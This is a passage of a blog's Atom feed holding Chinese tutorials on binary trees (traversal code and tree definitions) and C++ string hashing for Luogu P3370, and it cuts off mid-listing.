class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;释放二叉树&#34;&gt;&lt;a href=&#34;#释放二叉树&#34; class=&#34;headerlink&#34; title=&#34;释放二叉树&#34;&gt;&lt;/a&gt;释放二叉树&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void BiTree&amp;lt;DataType&amp;gt;::Release(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(bt != NULL)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Release(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Release(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        delete bt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;前序遍历&#34;&gt;&lt;a href=&#34;#前序遍历&#34; class=&#34;headerlink&#34; title=&#34;前序遍历&#34;&gt;&lt;/a&gt;前序遍历&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void BiTree&amp;lt;DataType&amp;gt;::PreOrder(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(bt == NULL) return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout&amp;lt;&amp;lt;bt-&amp;gt;data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        PreOrder(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        PreOrder(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;中序遍历&#34;&gt;&lt;a href=&#34;#中序遍历&#34; class=&#34;headerlink&#34; title=&#34;中序遍历&#34;&gt;&lt;/a&gt;中序遍历&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void BiTree&amp;lt;DataType&amp;gt;::InOrder(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(bt == NULL) return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        InOrder(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout&amp;lt;&amp;lt;bt-&amp;gt;data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        InOrder(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;后序遍历&#34;&gt;&lt;a href=&#34;#后序遍历&#34; class=&#34;headerlink&#34; title=&#34;后序遍历&#34;&gt;&lt;/a&gt;后序遍历&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;template &amp;lt;class DataType&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;void BiTree&amp;lt;DataType&amp;gt;::PostOrder(BiNode&amp;lt;DataType&amp;gt; *bt)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if(bt == NULL) return;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        PostOrder(bt-&amp;gt;lchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        PostOrder(bt-&amp;gt;rchild);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        cout&amp;lt;&amp;lt;bt-&amp;gt;data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;满二叉树&#34;&gt;&lt;a href=&#34;#满二叉树&#34; class=&#34;headerlink&#34; title=&#34;满二叉树&#34;&gt;&lt;/a&gt;满二叉树&lt;/h3&gt;&lt;p&gt;一棵深度为k且有2^k-1个结点的二叉树称为满二叉树。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20180611151745758?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;满二叉树的性质：&#34;&gt;&lt;a href=&#34;#满二叉树的性质：&#34; class=&#34;headerlink&#34; title=&#34;满二叉树的性质：&#34;&gt;&lt;/a&gt;满二叉树的性质：&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;一颗树深度为h最大层数为k深度与最大层数相同，k &amp;#x3D; h ;&lt;/li&gt;
&lt;li&gt;叶子数为2h;&lt;/li&gt;
&lt;li&gt;第k层的结点数是2^k−1;&lt;/li&gt;
&lt;li&gt;总结点数是：2^k−1且总节点数一定是奇数。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;完全二叉树&#34;&gt;&lt;a href=&#34;#完全二叉树&#34; class=&#34;headerlink&#34; title=&#34;完全二叉树&#34;&gt;&lt;/a&gt;完全二叉树&lt;/h3&gt;&lt;p&gt;深度为k的，有n个结点的二叉树，当且仅当其每一个结点都与深度为k的满二叉树中编号从1至n的结点一一对应时，称之为完全二叉树。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdn.net/20180611151734461?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMwNjExNjAx/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70&#34;&gt;&lt;/p&gt;
&lt;p&gt;完全二叉树是效率很高的数据结构，堆是一种完全二叉树或者近似完全二叉树，所以效率极高，像十分常用的排序算法、Dijkstra算法、Prim算法等都要用堆才能优化，二叉排序树的效率也要借助平衡性来提高，而平衡性基于完全二叉树。&lt;/p&gt;
&lt;h3 id=&#34;二叉排序树&#34;&gt;&lt;a href=&#34;#二叉排序树&#34; class=&#34;headerlink&#34; title=&#34;二叉排序树&#34;&gt;&lt;/a&gt;二叉排序树&lt;/h3&gt;&lt;p&gt;二叉查找树定义：又称为是二叉排序树（Binary Sort Tree）或二叉搜索树。&lt;/p&gt;
&lt;p&gt;二叉排序树或者是一棵空树，或者是具有下列性质的二叉树：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;若它的左子树不空，则左子树上所有结点的值均小于它的根结点的值；&lt;/li&gt;
&lt;li&gt;若它的右子树不空，则右子树上所有结点的值均大于或等于它的根结点的值；&lt;/li&gt;
&lt;li&gt;它的左、右子树也分别为二叉排序树。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;平衡二叉树&#34;&gt;&lt;a href=&#34;#平衡二叉树&#34; class=&#34;headerlink&#34; title=&#34;平衡二叉树&#34;&gt;&lt;/a&gt;平衡二叉树&lt;/h3&gt;&lt;p&gt;平衡二叉树（Balanced Binary Tree）又被称为AVL树。它或者是一棵空树，或者是具有下列性质的二叉树：它的左子树和右子树都是平衡二叉树，且左子树和右子树的深度之差的绝对值不超过1。（注：平衡二叉树应该是一棵二叉排序树）&lt;/p&gt;
</content>
        <updated>2023-01-13T19:27:09.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/14/CPP%E5%AD%97%E7%AC%A6%E4%B8%B2hash/</id>
        <title>CPP字符串hash</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/14/CPP%E5%AD%97%E7%AC%A6%E4%B8%B2hash/"/>
        <content type="html">&lt;h1 id=&#34;Hash&#34;&gt;&lt;a href=&#34;#Hash&#34; class=&#34;headerlink&#34; title=&#34;Hash&#34;&gt;&lt;/a&gt;Hash&lt;/h1&gt;&lt;p&gt;Hash就是一个像函数一样的东西，你放进去一个值，它给你输出来一个值。输出的值就是Hash值。一般Hash值会比原来的值更好储存(更小)或比较。&lt;/p&gt;
&lt;p&gt;那字符串Hash就非常好理解了。就是把字符串转换成一个整数的函数。而且要尽量做到使字符串对应唯一的Hash值。&lt;/p&gt;
&lt;p&gt;字符串Hash的种类还是有很多种的，不过在信息学竞赛中只会用到一种名为“BKDR Hash”的字符串Hash算法。&lt;/p&gt;
&lt;p&gt;它的主要思路是选取恰当的进制，可以把字符串中的字符看成一个大数字中的每一位数字，不过比较字符串和比较大数字的复杂度并没有什么区别(高精数的比较也是O(n)&lt;/p&gt;
&lt;p&gt;那么我们选择什么进制比较好？&lt;/p&gt;
&lt;p&gt;首先不要把任意字符对应到数字0，比如假如把a对应到数字0，那么将不能只从Hash结果上区分ab和b（虽然可以额外判断字符串长度，但不把任意字符对应到数字0更加省事且没有任何副作用），一般而言，把a-z对应到数字1-26比较合适。&lt;/p&gt;
&lt;p&gt;关于进制的选择实际上非常自由，大于所有字符对应的数字的最大值，不要含有模数的质因子(那还模什么)，比如一个字符集是a到z的题目，选择27、233、19260817都是可以的。&lt;/p&gt;
&lt;p&gt;模数的选择（尽量还是要选择质数）：&lt;/p&gt;
&lt;p&gt;绝大多数情况下，不要选择一个109&lt;/p&gt;
&lt;p&gt;最稳妥的办法是选择两个109如果能背过或在考场上找出一个1018偷懒的写法就是直接使用unsigned long long，不手动进行取模，它溢出时会自动对264&lt;/p&gt;
&lt;h2 id=&#34;用luogu-P3370为例。&#34;&gt;&lt;a href=&#34;#用luogu-P3370为例。&#34; class=&#34;headerlink&#34; title=&#34;用luogu P3370为例。&#34;&gt;&lt;/a&gt;用luogu P3370为例。&lt;/h2&gt;&lt;p&gt;这是自然溢出hash(100)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull a[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hashs(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=ans*base+(ull)s[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans&amp;amp;0x7fffffff;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s&amp;quot;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i]=hashs(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sort(a+1,a+n+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=2;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (a[i]!=a[i-1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这是单模数hash(80)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull a[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull mod=19260817;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hashs(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=(ans*base+(ull)s[i])%mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s&amp;quot;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i]=hashs(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sort(a+1,a+n+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=2;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (a[i]!=a[i-1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这是双hash(100)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span 